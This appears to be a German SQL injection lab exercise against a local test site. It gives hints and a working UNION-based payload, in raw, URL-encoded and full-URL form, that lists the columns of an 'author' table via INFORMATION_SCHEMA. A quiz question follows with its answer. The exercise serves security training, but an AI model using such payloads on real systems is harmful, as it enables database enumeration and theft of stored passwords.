Lesen Sie als Nächstes die Spaltennamen der Tabelle aus.

Tipp:
Sie benötigen `GROUP_CONCAT()` und `INFORMATION_SCHEMA.COLUMNS`.

Tipp 2:
https://dev.mysql.com/doc/refman/8.0/en/information-schema-innodb-columns-table.html

' AND 1=0 UNION SELECT 0,0,0,0,0,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='author'),0;--
'%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2C(SELECT%20GROUP_CONCAT(COLUMN_NAME)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%3D'author')%2C0%3B--%20
http://localhost:82/index.php?id=2%27%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2C(SELECT%20GROUP_CONCAT(COLUMN_NAME)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%3D%27author%27)%2C0%3B--%20

>>13) Welche Spalten enthält die Tabelle? Geben Sie die Spaltennamen in der Reihenfolge der Ausgabe und mit Leerzeichen getrennt an.<<
      === id username name email password